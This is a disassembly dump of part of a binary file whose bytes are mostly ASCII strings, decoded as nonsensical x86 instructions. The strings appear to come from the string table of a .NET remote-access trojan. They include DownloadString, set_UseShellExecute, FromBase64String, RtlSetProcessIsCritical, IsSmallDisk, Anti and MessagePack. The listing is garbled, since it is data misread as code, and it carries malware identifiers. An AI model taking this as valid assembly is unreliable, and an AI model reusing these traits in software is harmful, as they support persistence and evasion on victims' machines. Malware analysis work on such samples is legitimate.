  408179:	74 74                	je     0x4081ef
  40817b:	72 69                	jb     0x4081e6
  40817d:	62 75 74             	bound  %esi,0x74(%ebp)
  408180:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408185:	67 65 74 46          	addr16 gs je 0x4081cf
  408189:	72 61                	jb     0x4081ec
  40818b:	6d                   	insl   (%dx),%es:(%edi)
  40818c:	65 77 6f             	gs ja  0x4081fe
  40818f:	72 6b                	jb     0x4081fc
  408191:	41                   	inc    %ecx
  408192:	74 74                	je     0x408208
  408194:	72 69                	jb     0x4081ff
  408196:	62 75 74             	bound  %esi,0x74(%ebp)
  408199:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40819d:	73 65                	jae    0x408204
  40819f:	6d                   	insl   (%dx),%es:(%edi)
  4081a0:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4081a4:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081ab:	69 
  4081ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ae:	41                   	inc    %ecx
  4081af:	74 74                	je     0x408225
  4081b1:	72 69                	jb     0x40821c
  4081b3:	62 75 74             	bound  %esi,0x74(%ebp)
  4081b6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081ba:	73 65                	jae    0x408221
  4081bc:	6d                   	insl   (%dx),%es:(%edi)
  4081bd:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c3:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081c9:	74 69                	je     0x408234
  4081cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4081cd:	41                   	inc    %ecx
  4081ce:	74 74                	je     0x408244
  4081d0:	72 69                	jb     0x40823b
  4081d2:	62 75 74             	bound  %esi,0x74(%ebp)
  4081d5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081d9:	73 65                	jae    0x408240
  4081db:	6d                   	insl   (%dx),%es:(%edi)
  4081dc:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081e0:	65 73 63             	gs jae 0x408246
  4081e3:	72 69                	jb     0x40824e
  4081e5:	70 74                	jo     0x40825b
  4081e7:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081ee:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081f5:	65 66 61             	gs popaw
  4081f8:	75 6c                	jne    0x408266
  4081fa:	74 4d                	je     0x408249
  4081fc:	65 6d                	gs insl (%dx),%es:(%edi)
  4081fe:	62 65 72             	bound  %esp,0x72(%ebp)
  408201:	41                   	inc    %ecx
  408202:	74 74                	je     0x408278
  408204:	72 69                	jb     0x40826f
  408206:	62 75 74             	bound  %esi,0x74(%ebp)
  408209:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40820d:	6d                   	insl   (%dx),%es:(%edi)
  40820e:	70 69                	jo     0x408279
  408210:	6c                   	insb   (%dx),%es:(%edi)
  408211:	61                   	popa
  408212:	74 69                	je     0x40827d
  408214:	6f                   	outsl  %ds:(%esi),(%dx)
  408215:	6e                   	outsb  %ds:(%esi),(%dx)
  408216:	52                   	push   %edx
  408217:	65 6c                	gs insb (%dx),%es:(%edi)
  408219:	61                   	popa
  40821a:	78 61                	js     0x40827d
  40821c:	74 69                	je     0x408287
  40821e:	6f                   	outsl  %ds:(%esi),(%dx)
  40821f:	6e                   	outsb  %ds:(%esi),(%dx)
  408220:	73 41                	jae    0x408263
  408222:	74 74                	je     0x408298
  408224:	72 69                	jb     0x40828f
  408226:	62 75 74             	bound  %esi,0x74(%ebp)
  408229:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40822d:	73 65                	jae    0x408294
  40822f:	6d                   	insl   (%dx),%es:(%edi)
  408230:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408234:	72 6f                	jb     0x4082a5
  408236:	64 75 63             	fs jne 0x40829c
  408239:	74 41                	je     0x40827c
  40823b:	74 74                	je     0x4082b1
  40823d:	72 69                	jb     0x4082a8
  40823f:	62 75 74             	bound  %esi,0x74(%ebp)
  408242:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408246:	73 65                	jae    0x4082ad
  408248:	6d                   	insl   (%dx),%es:(%edi)
  408249:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40824d:	6f                   	outsl  %ds:(%esi),(%dx)
  40824e:	70 79                	jo     0x4082c9
  408250:	72 69                	jb     0x4082bb
  408252:	67 68 74 41 74 74    	addr16 push $0x74744174
  408258:	72 69                	jb     0x4082c3
  40825a:	62 75 74             	bound  %esi,0x74(%ebp)
  40825d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408261:	73 65                	jae    0x4082c8
  408263:	6d                   	insl   (%dx),%es:(%edi)
  408264:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408268:	6f                   	outsl  %ds:(%esi),(%dx)
  408269:	6d                   	insl   (%dx),%es:(%edi)
  40826a:	70 61                	jo     0x4082cd
  40826c:	6e                   	outsb  %ds:(%esi),(%dx)
  40826d:	79 41                	jns    0x4082b0
  40826f:	74 74                	je     0x4082e5
  408271:	72 69                	jb     0x4082dc
  408273:	62 75 74             	bound  %esi,0x74(%ebp)
  408276:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40827a:	6e                   	outsb  %ds:(%esi),(%dx)
  40827b:	74 69                	je     0x4082e6
  40827d:	6d                   	insl   (%dx),%es:(%edi)
  40827e:	65 43                	gs inc %ebx
  408280:	6f                   	outsl  %ds:(%esi),(%dx)
  408281:	6d                   	insl   (%dx),%es:(%edi)
  408282:	70 61                	jo     0x4082e5
  408284:	74 69                	je     0x4082ef
  408286:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408289:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408290:	69 
  408291:	62 75 74             	bound  %esi,0x74(%ebp)
  408294:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408298:	74 5f                	je     0x4082f9
  40829a:	55                   	push   %ebp
  40829b:	73 65                	jae    0x408302
  40829d:	53                   	push   %ebx
  40829e:	68 65 6c 6c 45       	push   $0x456c6c65
  4082a3:	78 65                	js     0x40830a
  4082a5:	63 75 74             	arpl   %esi,0x74(%ebp)
  4082a8:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082ac:	61                   	popa
  4082ad:	64 42                	fs inc %edx
  4082af:	79 74                	jns    0x408325
  4082b1:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082b5:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082bc:	00 
  4082bd:	44                   	inc    %esp
  4082be:	65 6c                	gs insb (%dx),%es:(%edi)
  4082c0:	65 74 65             	gs je  0x408328
  4082c3:	56                   	push   %esi
  4082c4:	61                   	popa
  4082c5:	6c                   	insb   (%dx),%es:(%edi)
  4082c6:	75 65                	jne    0x40832d
  4082c8:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4082cc:	65 72 56             	gs jb  0x408325
  4082cf:	61                   	popa
  4082d0:	6c                   	insb   (%dx),%es:(%edi)
  4082d1:	75 65                	jne    0x408338
  4082d3:	00 47 65             	add    %al,0x65(%edi)
  4082d6:	74 56                	je     0x40832e
  4082d8:	61                   	popa
  4082d9:	6c                   	insb   (%dx),%es:(%edi)
  4082da:	75 65                	jne    0x408341
  4082dc:	00 53 65             	add    %dl,0x65(%ebx)
  4082df:	74 56                	je     0x408337
  4082e1:	61                   	popa
  4082e2:	6c                   	insb   (%dx),%es:(%edi)
  4082e3:	75 65                	jne    0x40834a
  4082e5:	00 76 61             	add    %dh,0x61(%esi)
  4082e8:	6c                   	insb   (%dx),%es:(%edi)
  4082e9:	75 65                	jne    0x408350
  4082eb:	00 67 65             	add    %ah,0x65(%edi)
  4082ee:	74 5f                	je     0x40834f
  4082f0:	4b                   	dec    %ebx
  4082f1:	65 65 70 41          	gs gs jo 0x408336
  4082f5:	6c                   	insb   (%dx),%es:(%edi)
  4082f6:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4082fd:	5f                   	pop    %edi
  4082fe:	4b                   	dec    %ebx
  4082ff:	65 65 70 41          	gs gs jo 0x408344
  408303:	6c                   	insb   (%dx),%es:(%edi)
  408304:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  40830b:	6f                   	outsl  %ds:(%esi),(%dx)
  40830c:	76 65                	jbe    0x408373
  40830e:	00 34 66             	add    %dh,(%esi,%eiz,2)
  408311:	72 66                	jb     0x408379
  408313:	6e                   	outsb  %ds:(%esi),(%dx)
  408314:	6a 34                	push   $0x34
  408316:	31 2e                	xor    %ebp,(%esi)
  408318:	65 78 65             	gs js  0x408380
  40831b:	00 73 65             	add    %dh,0x65(%ebx)
  40831e:	74 5f                	je     0x40837f
  408320:	42                   	inc    %edx
  408321:	6c                   	insb   (%dx),%es:(%edi)
  408322:	6f                   	outsl  %ds:(%esi),(%dx)
  408323:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408326:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40832d:	5f                   	pop    %edi
  40832e:	54                   	push   %esp
  40832f:	6f                   	outsl  %ds:(%esi),(%dx)
  408330:	74 61                	je     0x408393
  408332:	6c                   	insb   (%dx),%es:(%edi)
  408333:	53                   	push   %ebx
  408334:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40833b:	5f                   	pop    %edi
  40833c:	48                   	dec    %eax
  40833d:	65 61                	gs popa
  40833f:	64 65 72 53          	fs gs jb 0x408396
  408343:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40834a:	5f                   	pop    %edi
  40834b:	48                   	dec    %eax
  40834c:	65 61                	gs popa
  40834e:	64 65 72 53          	fs gs jb 0x4083a5
  408352:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408359:	5f                   	pop    %edi
  40835a:	53                   	push   %ebx
  40835b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40835d:	64 42                	fs inc %edx
  40835f:	75 66                	jne    0x4083c7
  408361:	66 65 72 53          	data16 gs jb 0x4083b8
  408365:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40836c:	5f                   	pop    %edi
  40836d:	52                   	push   %edx
  40836e:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408372:	76 65                	jbe    0x4083d9
  408374:	42                   	inc    %edx
  408375:	75 66                	jne    0x4083dd
  408377:	66 65 72 53          	data16 gs jb 0x4083ce
  40837b:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408382:	5f                   	pop    %edi
  408383:	4b                   	dec    %ebx
  408384:	65 79 53             	gs jns 0x4083da
  408387:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  40838e:	65 78 4f             	gs js  0x4083e0
  408391:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  408395:	72 46                	jb     0x4083dd
  408397:	6c                   	insb   (%dx),%es:(%edi)
  408398:	61                   	popa
  408399:	67 00 43 72          	add    %al,0x72(%bp,%di)
  40839d:	79 70                	jns    0x40840f
  40839f:	74 6f                	je     0x408410
  4083a1:	43                   	inc    %ebx
  4083a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a4:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083aa:	74 5f                	je     0x40840b
  4083ac:	50                   	push   %eax
  4083ad:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083b4:	5f                   	pop    %edi
  4083b5:	50                   	push   %eax
  4083b6:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083bd:	74 65                	je     0x408424
  4083bf:	6d                   	insl   (%dx),%es:(%edi)
  4083c0:	2e 54                	cs push %esp
  4083c2:	68 72 65 61 64       	push   $0x64616572
  4083c7:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083ce:	5f                   	pop    %edi
  4083cf:	50                   	push   %eax
  4083d0:	61                   	popa
  4083d1:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083d8:	64 64 
  4083da:	5f                   	pop    %edi
  4083db:	53                   	push   %ebx
  4083dc:	65 73 73             	gs jae 0x408452
  4083df:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e7:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083eb:	73 74                	jae    0x408461
  4083ed:	65 6d                	gs insl (%dx),%es:(%edi)
  4083ef:	45                   	inc    %ebp
  4083f0:	76 65                	jbe    0x408457
  4083f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f3:	74 73                	je     0x408468
  4083f5:	5f                   	pop    %edi
  4083f6:	53                   	push   %ebx
  4083f7:	65 73 73             	gs jae 0x40846d
  4083fa:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408401:	6e                   	outsb  %ds:(%esi),(%dx)
  408402:	67 00 55 54          	add    %dl,0x54(%di)
  408406:	46                   	inc    %esi
  408407:	38 45 6e             	cmp    %al,0x6e(%ebp)
  40840a:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40840d:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408414:	74 65                	je     0x40847b
  408416:	6d                   	insl   (%dx),%es:(%edi)
  408417:	2e 44                	cs inc %esp
  408419:	72 61                	jb     0x40847c
  40841b:	77 69                	ja     0x408486
  40841d:	6e                   	outsb  %ds:(%esi),(%dx)
  40841e:	67 2e 49             	addr16 cs dec %ecx
  408421:	6d                   	insl   (%dx),%es:(%edi)
  408422:	61                   	popa
  408423:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  40842a:	73 
  40842b:	74 65                	je     0x408492
  40842d:	6d                   	insl   (%dx),%es:(%edi)
  40842e:	2e 52                	cs push %edx
  408430:	75 6e                	jne    0x4084a0
  408432:	74 69                	je     0x40849d
  408434:	6d                   	insl   (%dx),%es:(%edi)
  408435:	65 2e 56             	gs cs push %esi
  408438:	65 72 73             	gs jb  0x4084ae
  40843b:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408442:	46                   	inc    %esi
  408443:	72 6f                	jb     0x4084b4
  408445:	6d                   	insl   (%dx),%es:(%edi)
  408446:	42                   	inc    %edx
  408447:	61                   	popa
  408448:	73 65                	jae    0x4084af
  40844a:	36 34 53             	ss xor $0x53,%al
  40844d:	74 72                	je     0x4084c1
  40844f:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408456:	61                   	popa
  408457:	73 65                	jae    0x4084be
  408459:	36 34 53             	ss xor $0x53,%al
  40845c:	74 72                	je     0x4084d0
  40845e:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  408465:	64 53                	fs push %ebx
  408467:	74 72                	je     0x4084db
  408469:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408470:	6e                   	outsb  %ds:(%esi),(%dx)
  408471:	6c                   	insb   (%dx),%es:(%edi)
  408472:	6f                   	outsl  %ds:(%esi),(%dx)
  408473:	61                   	popa
  408474:	64 53                	fs push %ebx
  408476:	74 72                	je     0x4084ea
  408478:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  40847f:	74 65                	je     0x4084e6
  408481:	53                   	push   %ebx
  408482:	74 72                	je     0x4084f6
  408484:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  40848b:	74 72                	je     0x4084ff
  40848d:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408494:	5f                   	pop    %edi
  408495:	41                   	inc    %ecx
  408496:	73 53                	jae    0x4084eb
  408498:	74 72                	je     0x40850c
  40849a:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4084a1:	5f                   	pop    %edi
  4084a2:	41                   	inc    %ecx
  4084a3:	73 53                	jae    0x4084f8
  4084a5:	74 72                	je     0x408519
  4084a7:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084ae:	65 73 41             	gs jae 0x4084f2
  4084b1:	73 53                	jae    0x408506
  4084b3:	74 72                	je     0x408527
  4084b5:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084bc:	41                   	inc    %ecx
  4084bd:	73 53                	jae    0x408512
  4084bf:	74 72                	je     0x408533
  4084c1:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084c8:	41                   	inc    %ecx
  4084c9:	73 53                	jae    0x40851e
  4084cb:	74 72                	je     0x40853f
  4084cd:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084d4:	53                   	push   %ebx
  4084d5:	74 72                	je     0x408549
  4084d7:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084de:	65 73 41             	gs jae 0x408522
  4084e1:	73 48                	jae    0x40852b
  4084e3:	65 78 53             	gs js  0x408539
  4084e6:	74 72                	je     0x40855a
  4084e8:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084ef:	73 74                	jae    0x408565
  4084f1:	72 69                	jb     0x40855c
  4084f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f4:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084f8:	73 74                	jae    0x40856e
  4084fa:	65 6d                	gs insl (%dx),%es:(%edi)
  4084fc:	2e 44                	cs inc %esp
  4084fe:	72 61                	jb     0x408561
  408500:	77 69                	ja     0x40856b
  408502:	6e                   	outsb  %ds:(%esi),(%dx)
  408503:	67 00 67 65          	add    %ah,0x65(%bx)
  408507:	74 5f                	je     0x408568
  408509:	41                   	inc    %ecx
  40850a:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40850e:	61                   	popa
  40850f:	74 65                	je     0x408576
  408511:	50                   	push   %eax
  408512:	6f                   	outsl  %ds:(%esi),(%dx)
  408513:	6e                   	outsb  %ds:(%esi),(%dx)
  408514:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408518:	74 5f                	je     0x408579
  40851a:	41                   	inc    %ecx
  40851b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40851f:	61                   	popa
  408520:	74 65                	je     0x408587
  408522:	50                   	push   %eax
  408523:	6f                   	outsl  %ds:(%esi),(%dx)
  408524:	6e                   	outsb  %ds:(%esi),(%dx)
  408525:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408529:	74 5f                	je     0x40858a
  40852b:	45                   	inc    %ebp
  40852c:	72 72                	jb     0x4085a0
  40852e:	6f                   	outsl  %ds:(%esi),(%dx)
  40852f:	72 44                	jb     0x408575
  408531:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408538:	73 67                	jae    0x4085a1
  40853a:	00 43 6f             	add    %al,0x6f(%ebx)
  40853d:	6d                   	insl   (%dx),%es:(%edi)
  40853e:	70 75                	jo     0x4085b5
  408540:	74 65                	je     0x4085a7
  408542:	48                   	dec    %eax
  408543:	61                   	popa
  408544:	73 68                	jae    0x4085ae
  408546:	00 73 74             	add    %dh,0x74(%ebx)
  408549:	72 54                	jb     0x40859f
  40854b:	6f                   	outsl  %ds:(%esi),(%dx)
  40854c:	48                   	dec    %eax
  40854d:	61                   	popa
  40854e:	73 68                	jae    0x4085b8
  408550:	00 47 65             	add    %al,0x65(%edi)
  408553:	74 48                	je     0x40859d
  408555:	61                   	popa
  408556:	73 68                	jae    0x4085c0
  408558:	00 56 65             	add    %dl,0x65(%esi)
  40855b:	72 69                	jb     0x4085c6
  40855d:	66 79 48             	data16 jns 0x4085a8
  408560:	61                   	popa
  408561:	73 68                	jae    0x4085cb
  408563:	00 46 6c             	add    %al,0x6c(%esi)
  408566:	75 73                	jne    0x4085db
  408568:	68 00 67 65 74       	push   $0x74656700
  40856d:	5f                   	pop    %edi
  40856e:	45                   	inc    %ebp
  40856f:	78 65                	js     0x4085d6
  408571:	63 75 74             	arpl   %esi,0x74(%ebp)
  408574:	61                   	popa
  408575:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408579:	61                   	popa
  40857a:	74 68                	je     0x4085e4
  40857c:	00 47 65             	add    %al,0x65(%edi)
  40857f:	74 54                	je     0x4085d5
  408581:	65 6d                	gs insl (%dx),%es:(%edi)
  408583:	70 50                	jo     0x4085d5
  408585:	61                   	popa
  408586:	74 68                	je     0x4085f0
  408588:	00 70 61             	add    %dh,0x61(%eax)
  40858b:	74 68                	je     0x4085f5
  40858d:	00 48 6d             	add    %cl,0x6d(%eax)
  408590:	61                   	popa
  408591:	63 53 68             	arpl   %edx,0x68(%ebx)
  408594:	61                   	popa
  408595:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  40859b:	67 74 68             	addr16 je 0x408606
  40859e:	00 67 65             	add    %ah,0x65(%edi)
  4085a1:	74 5f                	je     0x408602
  4085a3:	4c                   	dec    %esp
  4085a4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a6:	67 74 68             	addr16 je 0x408611
  4085a9:	00 49 76             	add    %cl,0x76(%ecx)
  4085ac:	4c                   	dec    %esp
  4085ad:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085af:	67 74 68             	addr16 je 0x40861a
  4085b2:	00 41 75             	add    %al,0x75(%ecx)
  4085b5:	74 68                	je     0x40861f
  4085b7:	4b                   	dec    %ebx
  4085b8:	65 79 4c             	gs jns 0x408607
  4085bb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085bd:	67 74 68             	addr16 je 0x408628
  4085c0:	00 55 72             	add    %dl,0x72(%ebp)
  4085c3:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085c9:	00 6d 73             	add    %ch,0x73(%ebp)
  4085cc:	67 70 61             	addr16 jo 0x408630
  4085cf:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085d2:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085d5:	6c                   	insb   (%dx),%es:(%edi)
  4085d6:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4085de:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085e1:	4d                   	dec    %ebp
  4085e2:	65 73 73             	gs jae 0x408658
  4085e5:	61                   	popa
  4085e6:	67 65 50             	addr16 gs push %eax
  4085e9:	61                   	popa
  4085ea:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085ed:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085f4:	61                   	popa
  4085f5:	67 65 50             	addr16 gs push %eax
  4085f8:	61                   	popa
  4085f9:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085fc:	4d                   	dec    %ebp
  4085fd:	73 67                	jae    0x408666
  4085ff:	50                   	push   %eax
  408600:	61                   	popa
  408601:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408604:	41                   	inc    %ecx
  408605:	73 79                	jae    0x408680
  408607:	6e                   	outsb  %ds:(%esi),(%dx)
  408608:	63 43 61             	arpl   %eax,0x61(%ebx)
  40860b:	6c                   	insb   (%dx),%es:(%edi)
  40860c:	6c                   	insb   (%dx),%es:(%edi)
  40860d:	62 61 63             	bound  %esp,0x63(%ecx)
  408610:	6b 00 52             	imul   $0x52,(%eax),%eax
  408613:	65 6d                	gs insl (%dx),%es:(%edi)
  408615:	6f                   	outsl  %ds:(%esi),(%dx)
  408616:	74 65                	je     0x40867d
  408618:	43                   	inc    %ebx
  408619:	65 72 74             	gs jb  0x408690
  40861c:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408623:	56                   	push   %esi
  408624:	61                   	popa
  408625:	6c                   	insb   (%dx),%es:(%edi)
  408626:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  40862d:	43 
  40862e:	61                   	popa
  40862f:	6c                   	insb   (%dx),%es:(%edi)
  408630:	6c                   	insb   (%dx),%es:(%edi)
  408631:	62 61 63             	bound  %esp,0x63(%ecx)
  408634:	6b 00 54             	imul   $0x54,(%eax),%eax
  408637:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  40863e:	6c                   	insb   (%dx),%es:(%edi)
  40863f:	62 61 63             	bound  %esp,0x63(%ecx)
  408642:	6b 00 75             	imul   $0x75,(%eax),%eax
  408645:	6e                   	outsb  %ds:(%esi),(%dx)
  408646:	70 61                	jo     0x4086a9
  408648:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  40864b:	6d                   	insl   (%dx),%es:(%edi)
  40864c:	73 67                	jae    0x4086b5
  40864e:	70 61                	jo     0x4086b1
  408650:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408653:	52                   	push   %edx
  408654:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40865b:	4b 65 
  40865d:	79 50                	jns    0x4086af
  40865f:	65 72 6d             	gs jb  0x4086cf
  408662:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408669:	68 65 63 6b 00       	push   $0x6b6365
  40866e:	46                   	inc    %esi
  40866f:	6c                   	insb   (%dx),%es:(%edi)
  408670:	75 73                	jne    0x4086e5
  408672:	68 46 69 6e 61       	push   $0x616e6946
  408677:	6c                   	insb   (%dx),%es:(%edi)
  408678:	42                   	inc    %edx
  408679:	6c                   	insb   (%dx),%es:(%edi)
  40867a:	6f                   	outsl  %ds:(%esi),(%dx)
  40867b:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40867e:	49                   	dec    %ecx
  40867f:	73 53                	jae    0x4086d4
  408681:	6d                   	insl   (%dx),%es:(%edi)
  408682:	61                   	popa
  408683:	6c                   	insb   (%dx),%es:(%edi)
  408684:	6c                   	insb   (%dx),%es:(%edi)
  408685:	44                   	inc    %esp
  408686:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  40868d:	6c                   	insb   (%dx),%es:(%edi)
  40868e:	00 66 56             	add    %ah,0x56(%esi)
  408691:	61                   	popa
  408692:	6c                   	insb   (%dx),%es:(%edi)
  408693:	00 69 56             	add    %ch,0x56(%ecx)
  408696:	61                   	popa
  408697:	6c                   	insb   (%dx),%es:(%edi)
  408698:	00 73 74             	add    %dh,0x74(%ebx)
  40869b:	72 56                	jb     0x4086f3
  40869d:	61                   	popa
  40869e:	6c                   	insb   (%dx),%es:(%edi)
  40869f:	00 52 74             	add    %dl,0x74(%edx)
  4086a2:	6c                   	insb   (%dx),%es:(%edi)
  4086a3:	53                   	push   %ebx
  4086a4:	65 74 50             	gs je  0x4086f7
  4086a7:	72 6f                	jb     0x408718
  4086a9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086ac:	73 49                	jae    0x4086f7
  4086ae:	73 43                	jae    0x4086f3
  4086b0:	72 69                	jb     0x40871b
  4086b2:	74 69                	je     0x40871d
  4086b4:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086b7:	00 50 72             	add    %dl,0x72(%eax)
  4086ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4086bb:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086be:	73 43                	jae    0x408703
  4086c0:	72 69                	jb     0x40872b
  4086c2:	74 69                	je     0x40872d
  4086c4:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086c7:	00 4e 65             	add    %cl,0x65(%esi)
  4086ca:	74 77                	je     0x408743
  4086cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4086cd:	72 6b                	jb     0x40873a
  4086cf:	43                   	inc    %ebx
  4086d0:	72 65                	jb     0x408737
  4086d2:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086d5:	74 69                	je     0x408740
  4086d7:	61                   	popa
  4086d8:	6c                   	insb   (%dx),%es:(%edi)
  4086d9:	00 53 79             	add    %dl,0x79(%ebx)
  4086dc:	73 74                	jae    0x408752
  4086de:	65 6d                	gs insl (%dx),%es:(%edi)
  4086e0:	2e 53                	cs push %ebx
  4086e2:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086e6:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086ed:	6e 
  4086ee:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086f1:	61                   	popa
  4086f2:	6c                   	insb   (%dx),%es:(%edi)
  4086f3:	00 57 69             	add    %dl,0x69(%edi)
  4086f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f7:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086f9:	77 73                	ja     0x40876e
  4086fb:	50                   	push   %eax
  4086fc:	72 69                	jb     0x408767
  4086fe:	6e                   	outsb  %ds:(%esi),(%dx)
